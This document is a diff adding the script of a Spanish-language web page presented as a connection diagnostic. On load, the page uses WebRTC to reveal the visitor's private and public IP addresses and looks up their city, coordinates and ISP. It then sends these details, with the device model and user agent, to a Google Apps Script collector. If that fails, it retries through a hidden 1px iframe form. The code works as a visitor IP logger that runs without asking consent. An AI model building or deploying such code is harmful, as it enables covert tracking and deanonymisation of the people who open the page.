+  data.append(
+    "asn",
+    getSheetValue("geoAsn")
+  );
+
+  data.append(
+    "hostname",
+    getSheetValue("geoHostname")
+  );
+
+
+  /*
+   * GPS desactivado.
+   * Se envían como "No disponible".
+   */
+
+  data.append(
+    "gpsLat",
+    "No disponible"
+  );
+
+  data.append(
+    "gpsLon",
+    "No disponible"
+  );
+
+  data.append(
+    "gpsAccuracy",
+    "No disponible"
+  );
+
+  data.append(
+    "gpsAltitude",
+    "No disponible"
+  );
+
+  data.append(
+    "gpsHeading",
+    "No disponible"
+  );
+
+  data.append(
+    "gpsSpeed",
+    "No disponible"
+  );
+
+
+  log(
+    "Datos preparados: " +
+    data.toString().length +
+    " caracteres"
+  );
+
+
+  if(typeof fetch !== "function"){
+
+    log(
+      "Fetch no disponible. Intentando FORM."
+    );
+
+    sendUsingForm(
+      ip,
+      ua,
+      platform,
+      sheetModel
+    );
+
+    return;
+
+  }
+
+
+  const start = Date.now();
+
+
+  fetch(
+    GOOGLE_SCRIPT_URL,
+    {
+      method:"POST",
+      mode:"no-cors",
+
+      headers:{
+        "Content-Type":
+          "application/x-www-form-urlencoded;charset=UTF-8"
+      },
+
+      body:
+        data.toString()
+    }
+  )
+
+  .then(function(response){
+
+    const elapsed =
+      Date.now() - start;
+
+    publicIpSent = true;
+
+    sendInProgress = false;
+
+    showDoneScreen();
+
+    log(
+      "FETCH POST aceptado en " +
+      elapsed +
+      " ms"
+    );
+
+    log(
+      "Response type: " +
+      response.type
+    );
+
+    log(
+      "Response status: " +
+      response.status
+    );
+
+
+    status.innerHTML =
+      '<span class="ok">✅ DATOS ENVIADOS</span>' +
+
+      "<br>Método: fetch POST" +
+
+      "<br>Tiempo: " +
+      elapsed +
+      " ms" +
+
+      "<br>IP: " +
+      ip +
+
+      "<br>Modelo: " +
+      model +
+
+      "<br><small>Verificá la hoja para confirmar la recepción.</small>";
+
+  })
+
+
+  .catch(function(error){
+
+    log(
+      "❌ Fetch falló: " +
+      (error.message || error)
+    );
+
+    log(
+      "Intentando FORM POST..."
+    );
+
+    sendUsingForm(
+      ip,
+      ua,
+      platform,
+      sheetModel
+    );
+
+  });
+
+}
+
+
+function getText(id){
+
+  const el =
+    document.getElementById(id);
+
+  if(!el)
+    return "";
+
+  const value =
+    el.textContent || "";
+
+  if(
+    value === "Detectando..." ||
+    value === "Esperando IP..." ||
+    value === "No disponible"
+  ){
+
+    return "";
+
+  }
+
+  return value;
+
+}
+
+
+function sendUsingForm(
+  ip,
+  ua,
+  platform,
+  model
+){
+
+  const start = Date.now();
+
+  log("--------------------------------");
+
+  log(
+    "MÉTODO 2: FORM POST"
+  );
+
+  log(
+    "Creando formulario..."
+  );
+
+
+  const iframe =
+    document.createElement(
+      "iframe"
+    );
+
+  iframe.name =
+    "google_sheet_hidden_frame_" +
+    Date.now();
+
+  iframe.style.position =
+    "fixed";
+
+  iframe.style.width =
+    "1px";
+
+  iframe.style.height =
+    "1px";
+
+  iframe.style.opacity =
+    "0";
+
+  iframe.style.pointerEvents =
+    "none";
+
+
+  document.body.appendChild(
+    iframe
+  );
+
+
+  const form =
+    document.createElement(
+      "form"
+    );
+
+  form.method = "POST";
+
+  form.action =
+    GOOGLE_SCRIPT_URL;
+
+  form.target =
+    iframe.name;
+
+  form.enctype =
+    "application/x-www-form-urlencoded";
+
+  form.style.display =
+    "none";
+
+
+  function addInput(
+    name,
+    value
+  ){
+
+    const input =
+      document.createElement(
+        "input"
+      );
+
+    input.type =
+      "hidden";
+
+    input.name =
+      name;
+
+    input.value =
+      value == null
+        ? ""
+        : String(value);
+
+    form.appendChild(
+      input
+    );
+
+  }
+
+
+  addInput(
+    "ip",
+    ip
+  );
+
+  addInput(
+    "userAgent",
+    ua
+  );
+
+  addInput(
+    "platform",
+    platform
+  );
+
+  addInput(
+    "model",
+    model
+  );
+
+  addInput(
+    "country",
+    getText("geoCountry")
+  );
+
+  addInput(
+    "region",
+    getText("geoRegion")
+  );
+
+  addInput(
+    "city",
+    getText("geoCity")
+  );
+
+  addInput(
+    "geoLat",
+    getText("geoLat")
+  );
+
+  addInput(
+    "geoLon",
+    getText("geoLon")
+  );
+
+  addInput(
+    "isp",
+    getText("geoIsp")
+  );
+
+  addInput(
+    "org",
+    getText("geoOrg")
+  );
+
+  addInput(
+    "asn",
+    getText("geoAsn")
+  );
+
+  addInput(
+    "hostname",
+    getText("geoHostname")
+  );
+
+
+  addInput(
+    "gpsLat",
+    "No disponible"
+  );
+
+  addInput(
+    "gpsLon",
+    "No disponible"
+  );
+
+  addInput(
+    "gpsAccuracy",
+    "No disponible"
+  );
+
+  addInput(
+    "gpsAltitude",
+    "No disponible"
+  );
+
+  addInput(
+    "gpsHeading",
+    "No disponible"
+  );
+
+  addInput(
+    "gpsSpeed",
+    "No disponible"
+  );
+
+
+  document.body.appendChild(
+    form
+  );
+
+
+  log(
+    "Formulario creado."
+  );
+
+  log(
+    "IP: " + ip
+  );
+
+  log(
+    "Modelo: " + model
+  );
+
+  log(
+    "Ejecutando submit()..."
+  );
+
+
+  try{
+
+    form.submit();
+
+    const elapsed =
+      Date.now() - start;
+
+    publicIpSent = true;
+
+    sendInProgress = false;
+
+    showDoneScreen();
+
+
+    log(
+      "FORM POST iniciado en " +
+      elapsed +
+      " ms"
+    );
+
+    log(
+      "El navegador aceptó la navegación/formulario."
+    );
+
+
+    document.getElementById(
+      "sendStatus"
+    ).innerHTML =
+
+      '<span class="ok">📨 FORM POST INICIADO</span>' +
+
+      "<br>Método: formulario POST" +
+
+      "<br>IP: " +
+      ip +
+
+      "<br>Modelo: " +
+      model +
+
+      "<br><small>Este método no permite confirmar la respuesta. Verificá la hoja.</small>";
+
+
+    setTimeout(function(){
+
+      try{
+        form.remove();
+      }
+      catch(e){}
+
+    },15000);
+
+
+    setTimeout(function(){
+
+      try{
+        iframe.remove();
+      }
+      catch(e){}
+
+    },30000);
+
+
+  }
+  catch(error){
+
+    log(
+      "❌ FORM POST falló: " +
+      (error.message || error)
+    );
+
+
+    document.getElementById(
+      "sendStatus"
+    ).innerHTML =
+
+      '<span class="error">❌ ENVÍO FALLIDO</span>' +
+
+      "<br>Fetch: FALLÓ" +
+
+      "<br>Form POST: FALLÓ" +
+
+      "<br>Error: " +
+      (error.message || error);
+
+  }
+
+}
+
+
+function startWebRTC(){
+
+  if(
+    typeof RTCPeerConnection !==
+    "function"
+  ){
+
+    log(
+      "WebRTC NO DISPONIBLE."
+    );
+
+    setValue(
+      "webrtc",
+      "No",
+      "error"
+    );
+
+    return;
+
+  }
+
+
+  log(
+    "Iniciando WebRTC"
+  );
+
+
+  let pc;
+
+
+  try{
+
+    pc =
+      new RTCPeerConnection({
+        iceServers:[
+          {
+            urls:
+              "stun:stun.l.google.com:19302"
+          }
+        ]
+      });
+
+
+    log(
+      "RTCPeerConnection creado"
+    );
+
+    log(
+      "STUN configurado"
+    );
+
+  }
+  catch(error){
+
+    log(
+      "ERROR creando RTCPeerConnection: " +
+      error.message
+    );
+
+    return;
+
+  }
+
+
+  try{
+
+    pc.createDataChannel(
+      "diagnostic"
+    );
+
+    log(
+      "DataChannel creado"
+    );
+
+  }
+  catch(error){
+
+    log(
+      "Error creando DataChannel: " +
+      error.message
+    );
+
+  }
+
+
+  pc.onicecandidate =
+    function(event){
+
+      if(!event.candidate){
+
+        log(
+          "ICE gathering finalizado."
+        );
+
+        return;
+
+      }
+
+
+      const candidate =
+        event.candidate.candidate ||
+        "";
+
+
+      log(
+        "ICE candidate: " +
+        candidate
+      );
+
+
+      const parts =
+        candidate.split(" ");
+
+
+      let ip = "";
+      let port = "";
+
+
+      if(parts.length >= 5)
+        ip = parts[4];
+
+      if(parts.length >= 6)
+        port = parts[5];
+
+
+      if(!ip)
+        return;
+
+
+      if(
+        candidate.indexOf("typ host") !== -1
+      ){
+
+        hostCount++;
+
+        setValue(
+          "hostCandidates",
+          hostCount
+        );
+
+
+        log(
+          "ICE host -> " +
+          ip
+        );
+
+
+        if(
+          /^192\.168\./.test(ip) ||
+          /^10\./.test(ip) ||
+          /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip)
+        ){
+
+          setValue(
+            "privateIp",
+            ip,
+            "ok"
+          );
+
+
+          detectPrivateSubnet(
+            ip
+          );
+
+
+          log(
+            "IP privada detectada: " +
+            ip
+          );
+
+
+          addCandidate(
+            ip,
+            "HOST",
+            port
+          );
+
+        }
+
+      }
+
+
+      if(
+        candidate.indexOf("typ srflx") !== -1
+      ){
+
+        srflxCount++;
+
+
+        setValue(
+          "srflxCandidates",
+          srflxCount
+        );
+
+
+        log(
+          "ICE srflx -> " +
+          ip
+        );
+
+
+        addCandidate(
+          ip,
+          "SRFLX",
+          port
+        );
+
+
+        if(ip){
+
+          setValue(
+            "publicIp",
+            ip,
+            "ok"
+          );
+
+
+          setValue(
+            "ipv4",
+            ip,
+            "ok"
+          );
+
+
+          setValue(
+            "connectionStatus",
+            "Conectado",
+            "ok"
+          );
+
+
+          log(
+            "IP PÚBLICA DETECTADA: " +
+            ip
+          );
+
+
+          detectGeoIP(
+            ip
+          );
+
+
+          if(!publicIpSent){
+
+            setTimeout(
+              function(){
+
+                sendIpToGoogleSheet(
+                  ip
+                );
+
+              },
+              1200
+            );
+
+          }
+
+        }
+
+      }
+
+    };
+
+
+  pc.createOffer()
+
+    .then(function(offer){
+
+      log(
+        "Offer creada"
+      );
+
+      return pc.setLocalDescription(
+        offer
+      );
+
+    })
+
+    .then(function(){
+
+      log(
+        "Descripción local WebRTC establecida"
+      );
+
+    })
+
+    .catch(function(error){
+
+      log(
+        "ERROR WebRTC: " +
+        error.message
+      );
+
+    });
+
+
+  setTimeout(function(){
+
+    if(
+      !document.getElementById(
+        "publicIp"
+      ).textContent ||
+
+      document.getElementById(
+        "publicIp"
+      ).textContent ===
+      "Detectando..."
+    ){
+
+      log(
+        "⚠️ No se detectó IP pública después de 10 segundos."
+      );
+
+
+      setValue(
+        "publicIp",
+        "No detectada",
+        "error"
+      );
+
+
+      setValue(
+        "connectionStatus",
+        "Sin IP pública",
+        "error"
+      );
+
+    }
+
+  },10000);
+
+}
+
+
+function updateDateTime(){
+
+  document.getElementById(
+    "dateTime"
+  ).textContent =
+    new Date().toString();
+
+}
+
+
+function runDiagnostic(){
+
+  debugEl.textContent = "";
+
+  publicIpSent = false;
+
+  sendInProgress = false;
+
+  hostCount = 0;
+
+  srflxCount = 0;
+
+
+  document.getElementById(
+    "iceList"
+  ).innerHTML = "";
+
+
+  log(
+    "================================"
+  );
+
+  log(
+    "INICIANDO DIAGNÓSTICO"
+  );
+
+  log(
+    "================================"
+  );
+
+
+  log(
+    "Origin: " +
+    location.origin
+  );
+
+  log(
+    "Protocol: " +
+    location.protocol
+  );
+
+  log(
+    "Secure: " +
+    window.isSecureContext
+  );
+
+  log(
+    "Fetch disponible: " +
+    (
+      typeof fetch === "function"
+        ? "SÍ"
+        : "NO"
+    )
+  );
+
+  log(
+    "URL Google configurada: " +
+    (
+      GOOGLE_SCRIPT_URL
+        ? "SÍ"
+        : "NO"
+    )
+  );
+
+
+  const device =
+    detectDevice();
+
+
+  detectBrowser();
+
+  detectCapabilities();
+
+  detectConnection();
+
+  updateDateTime();
+
+
+  /*
+   * IMPORTANTE:
+   * NO se llama a detectGPS().
+   * La página nunca solicita ubicación.
+   */
+
+
+  setValue(
+    "geoPermission",
+    "No solicitado"
+  );
+
+  setValue(
+    "gpsLat",
+    "No disponible"
+  );
+
+  setValue(
+    "gpsLon",
+    "No disponible"
+  );
+
+  setValue(
+    "gpsAccuracy",
+    "No disponible"
+  );
+
+  setValue(
+    "gpsAltitude",
+    "No disponible"
+  );
+
+  setValue(
+    "gpsHeading",
+    "No disponible"
+  );
+
+  setValue(
+    "gpsSpeed",
+    "No disponible"
+  );
+
+  setValue(
+    "gpsStatus",
+    "Ubicación del dispositivo no utilizada.",
+    "info"
+  );
+
+
+  log(
+    "GPS/Geolocation: NO UTILIZADO"
+  );
+
+
+  log(
+    "Modelo detectado: " +
+    device.model
+  );
+
+  log(
+    "Platform detectado: " +
+    device.platform
+  );
+
+
+  log(
+    "================================"
+  );
+
+  log(
+    "INICIANDO WEBRTC"
+  );
+
+  log(
+    "================================"
+  );
+
+
+  startWebRTC();
+
+}
+
+
+runDiagnostic();
+
+</script>
+
+</body>
+
+</html>
